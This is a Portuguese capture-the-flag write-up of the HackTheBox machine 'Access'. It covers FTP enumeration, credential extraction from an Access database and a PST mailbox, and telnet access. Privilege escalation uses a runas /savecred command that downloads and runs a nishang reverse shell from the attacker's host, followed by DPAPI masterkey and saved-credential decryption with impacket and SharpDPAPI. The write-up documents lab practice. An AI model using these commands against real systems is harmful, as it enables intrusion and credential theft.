# Writeup access - PT-BR

## Scan

```bash
# Nmap 7.92 scan initiated Tue Dec 13 18:48:26 2022 as: nmap -sVC -A -T5 -p 21,23,80 -v -oN fullnmap.txt 10.129.91.76
Nmap scan report for 10.129.91.76
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 13 18:51:28 2022 -- 1 IP address (1 host up) scanned in 182.22 seconds
```

## Enumeration

    Com o scan feito, podemos ver que o login anônimo. Usando o login anonymous, podemo ver que possui dois diretórios. 

```bash
ftp> dir
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
```

    Dentro de cada diretório possui um arquivo diferente, para baixarmos tudo de forma recursiva podemos usar o seguinte comando:

```bash
wget --no-passive-ftp -m ftp://anonymous:anonymous@IP
```

    Após baixarmos os diretórios e arquivos, nota-se que o arquivo do diretório "Engineer" é um arquivo zip encryptado, ou seja, é necessário uma senha. Desse modo, nosso únioc caminho dispoível é pelo arquivo do diretório "Backups", que é um arquivo **Microsoft Access Database**.

    O kali possui um utilitário chamado "mdb-tools" que possui vários comandos para manuseio de arquivos MDB.

    De início, é necessário descobrir quais tabelas existe nessa base de dados, para isso, usamos o comando `mdb-tables FILE`.

> Tabelas do arquivo backups.mdb

```bash
mdb-tables backup.mdb 
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

    Dando uma olhada nos nomes, podemos ver algumas tabelas que podem remeter a informações interessantes. Depois, de um tempo olhando, a tabela que nos interessa é a com nome "auth_user".

    Para extrair seu conteúdo, podemos usar o comando `mdb-export`.

```bash
mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

    Podemos ver que existe credenciais nessa tabela, uma dessas credenciais é do "engineer" o que nos faz pensar que o arquivo encryptado no diretório "Engineer" pode ser dele.

    Usando uma técnica de password reuse, descobrimos que a senha **access4u@security** é a senha que descriptografa o arquivo zip. 

    Uma vez descriptografado, temos o arquivo "Access Control.pst", que é um "Microsoft Outlook email folder". Para podermos ler seu conteúdo, podemos usar o comando `readpst` para transformar o arquivo em um arquivo legível.

```bash
readpst Access\ Control.pst         
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

    Um arquivo .mbox foi gerado e agora podemos usá-lo para ler o conteúdo do email.

    Uma vez lido o email, podemos identificar a existência de uma conta chamada **security** com senha **4Cc3ssC0ntr0ller**.

## Exploitation

    Com as novas credenciais descobertas, podemos acessar o telnet e pegar a flag.

> Logando telnet

```bash
telnet 10.129.91.76
Trying 10.129.91.76...
Connected to 10.129.91.76.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

> User Flag

```bash
C:\Users\security>cd desktop

C:\Users\security\Desktop>type user.txt
274c367020e11ecbc7698f5c239ca09b
```

## Privilege Escalation

Essa máquina possui dois meios de se pegar a flag de root.

Para pegarmos uma shell powershell, podemos utilizar o segundo comando `powershell -file -`. 

### Método Um

    Com a shell do usuário security, podemos encontrar um aqruivo link chamado "ZKAccess3.5 Security System.lnk" no diretório **C:\Users\Public\Desktop**.

    Ao olhar o conteúdo desse arquivo podemos ver que o user Administrador possui suas credenciais salvas e que podem ser usadas através do programa `runas`.

> Fragmento Arquivo

```powershell
Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe
```

    Podemos confirmar a questão das credenciais armazenadas usando o seguinte comando: 

```powershell
PS C:\Users\security> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

    Com a senha do administrador armazenada, podemos usar o `runas` para pegar uma shell com o **Invoke-PowerShellTcp.ps1** do nishang.

    Para que a shell funcione, precisamos adicionar o seguinte comando no final do arquivo: 

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress MACHINE_IP -Port 4444
```

     Com a shell alterada, executamos o privesc

> Comando Runas

```powershell
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.82/Invoke-PowerShellTcp.ps1')"
```

> Root Flag

```powershell
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.91.76] 49162
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>cd c:\users\administrator\desktop
PS C:\users\administrator\desktop> type root.txt
1c7ea0b913db5094cdbcde9a9f744a07
PS C:\users\administrator\desktop>
```

### Método Dois

    O segundo método utilizará do DPAPI para fazer a escalação.

    Primeiramente, precisamos encontrar o SID, o arquivo das masterkeys e o de credentials.

> SID e Masterkey - Locais Possíveis

```bash
C:\Users\USER\AppData\Roaming\Microsoft\Protect\
C:\Users\USER\AppData\Local\Microsoft\Protect\
```

    Neste CTF, podemos encontrar o SID entrando no diretório `AppData\Roaming\Microsoft\Protect` do usuário "security".

```powershell
PS C:\Users\security> cd AppData\Roaming\Microsoft\Protect\
PS C:\Users\security\AppData\Roaming\Microsoft\Protect> ls -force


    Directory: C:\Users\security\AppData\Roaming\Microsoft\Protect


Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
d---s         8/22/2018  10:18 PM            S-1-5-21-953262931-566350628-63446256-1001                                                                                                     
-a-hs         8/22/2018  10:18 PM         24 CREDHIST                                                                                                                                       


PS C:\Users\security\AppData\Roaming\Microsoft\Protect>
```

> SID: S-1-5-21-953262931-566350628-63446256-1001

    Para pegar as masterkeys, entramos no diretório do SID.

```powershell
PS C:\Users\security\AppData\Roaming\Microsoft\Protect> cd S-1-5-21-953262931-566350628-63446256-1001
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> ls -force


    Directory: C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001


Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
-a-hs         8/22/2018  10:18 PM        468 0792c32e-48a5-4fe3-8b43-d93d64590580                                                                                                           
-a-hs         8/22/2018  10:18 PM         24 Preferred                                                                                                                                      


PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>
```

> Masterkey File: 0792c32e-48a5-4fe3-8b43-d93d64590580

    Ok, identificado o arquivo da masterkey temos que pegar seu conteúdo, para isso podemos converter sua saída binária em base64 usando os seguintes métodos:

> Powershell Convert
> 
> [convert]::ToBase64String((Get-Content -path "FILE" -Encoding byte))

```powershell
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> ls -force


    Directory: C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001


Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
-a-hs         8/22/2018  10:18 PM        468 0792c32e-48a5-4fe3-8b43-d93d64590580                                                                                                           
-a-hs         8/22/2018  10:18 PM         24 Preferred                                                                                                                                      


PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> [convert]::ToBase64String((Get-Content -path "0792c32e-48a5-4fe3-8b43-d93d64590580" -Encoding byte))
AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU
+/9guV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEq
OtnHqMOcwFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAAD+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgb
TN1Op8Rl3qp1Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>
```

> Certutil Encode
> certutil -encode MASTERKEY_FILE OUTFILE

```powershell
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 Outfile
Input Length = 468
Output Length = 700
CertUtil: -encode command completed successfully.
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> ls


    Directory: C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001


Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
-a---        12/14/2022   9:24 PM        700 Outfile                                                                                                                                        


PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> type outfile
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA
LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA
sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g
uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6
DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7
Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc
wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA
D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1
/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1
Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
-----END CERTIFICATE-----
PS C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>
```

    Com o conteúdo encodado, podemos pegar e passar para nossa máquina, descodar e gerar o arquivo binário da Masterkey.

```bash
echo "AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU
+/9guV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEq
OtnHqMOcwFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAAD+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgb
TN1Op8Rl3qp1Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ" | base64 -d > MASTERKEY
```

    Com o arquivo MASTERKEY em mãos, partimos para os de Credenciais.

> Credentials - Locais Possíveis

```bash
C:\Users\USER\AppData\Roaming\Microsoft\Credentials\
C:\Users\USER\AppData\Local\Microsoft\Credentials\
```

    Neste CTF, podemos encontrar o SID entrando no diretório `AppData\Roaming\Microsoft\Credentials` do usuário "security".

```powershell
PS C:\Users\security>cd AppData\Roaming\Microsoft\Credentials\
PS C:\Users\security\AppData\Roaming\Microsoft\Credentials> ls -force


    Directory: C:\Users\security\AppData\Roaming\Microsoft\Credentials


Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
-a-hs         8/22/2018  10:18 PM        538 51AB168BE4BDB3A603DADE4F8CA81290                                                                                                               


PS C:\Users\security\AppData\Roaming\Microsoft\Credentials>
```

    Com o arquivo encontrado, podemos utilizar a mesma técnica de conversão usada para a masterkey.

> Conversão

```powershell
Mode                LastWriteTime     Length Name                                                                                                                                           
----                -------------     ------ ----                                                                                                                                           
-a-hs         8/22/2018  10:18 PM        538 51AB168BE4BDB3A603DADE4F8CA81290                                                                                                               


PS C:\Users\security\AppData\Roaming\Microsoft\Credentials> [convert]::ToBase64String((Get-Content -path "51AB168BE4BDB3A603DADE4F8CA81290" -Encoding byte))
AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308
LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMz
KAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuh
fXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ==
PS C:\Users\security\AppData\Roaming\Microsoft\Credentials>
```

> Desconvertendo para binário

```bash
echo "AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308
LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMz
KAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuh
fXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ==" | base64 -d > Credentials
```

    Com os arquivos em mãos, podemos utilizar algumas maneiras para descodar os arquivos, sendo elas Mimikatz, DPAPI.py etc.

    Neste CTF, será usado o DPAPI.py do Impacket.

    Para descriptografarmos a masterkey precisamos dos seguintes itens:

- MasterKey File

- SID

- Senha/hash de algum usuário



> Decrypt MasterKey

```python
python3 dpapi.py masterkey -file ~/Desktop/hackthebox/machines/to-do/access/MASTERKEY -sid S-1-5-21-953262931-566350628-63446256-1001 -password 4Cc3ssC0ntr0ller 
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 0792c32e-48a5-4fe3-8b43-d93d64590580
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
```

    Com a MasterKey decrypted, podemos usá-la para descriptografar o arquivo credentials.

> Decrypt Credentials

```python
python3 dpapi.py credential -file ~/Desktop/hackthebox/machines/to-do/access/Credentials -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[CREDENTIAL]
LastWritten : 2018-08-22 21:18:49
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:interactive=ACCESS\Administrator
Description : 
Unknown     : 
Username    : ACCESS\Administrator
Unknown     : 55Acc3ssS3cur1ty@megacorp
```

    E boom, temos as credenciais do Administrator e podemos usá-la para conectar no telnet.

```bash
└─$ telnet 10.129.123.31                       
Trying 10.129.123.31...
Connected to 10.129.123.31.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: Administrator
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\Administrator>whoami
access\administrator

C:\Users\Administrator>
```



### DPAPI Localmente usando SharpDPAPI

    Como esse ctf não permite execução de arquivos .exe com o usuário "security", podemos usar a conta de admin para testar a ferramenta SharpDPAPI.

> Extrair MasterKey já decriptada e SID

```bash
C:\Users\Administrator\Desktop>SharpDPAPI.exe masterkeys /password:4Cc3ssC0ntr0ller

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.1                               


[*] Action: User DPAPI Masterkey File Triage

[*] Will decrypt user masterkeys with password: 4Cc3ssC0ntr0ller

[*] Found MasterKey : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-500\9851d4a5-f9b1-4277-b4ee-188e11f8e997
[*] Found MasterKey : C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580

[*] User master key cache:

{0792c32e-48a5-4fe3-8b43-d93d64590580}:BF6D0654EF999C3AD5B09692944DA3C0D0B68AFE




SharpDPAPI completed in 00:00:00.3149626

C:\Users\Administrator\Desktop>
```

> Descriptografar Credentials passando o SID e Masterkey decrypted

```bash
C:\Users\Administrator\Desktop>SharpDPAPI.exe credentials {0792c32e-48a5-4fe3-8b43-d93d64590580}:BF6D0654EF999C3AD5B09692944DA3C0D0B68AFE

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.1                               


[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users


Folder       : C:\Users\security\AppData\Roaming\Microsoft\Credentials\

  CredFile           : 51AB168BE4BDB3A603DADE4F8CA81290

    guidMasterKey    : {0792c32e-48a5-4fe3-8b43-d93d64590580}
    size             : 538
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data

    LastWritten      : 8/22/2018 10:18:49 PM
    TargetName       : Domain:interactive=ACCESS\Administrator
    TargetAlias      : 
    Comment          : 
    UserName         : ACCESS\Administrator
    Credential       : 55Acc3ssS3cur1ty@megacorp



SharpDPAPI completed in 00:00:00.0815681

C:\Users\Administrator\Desktop>
```



### Referências:

* https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb

* [DPAPI - Extracting Passwords - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) 
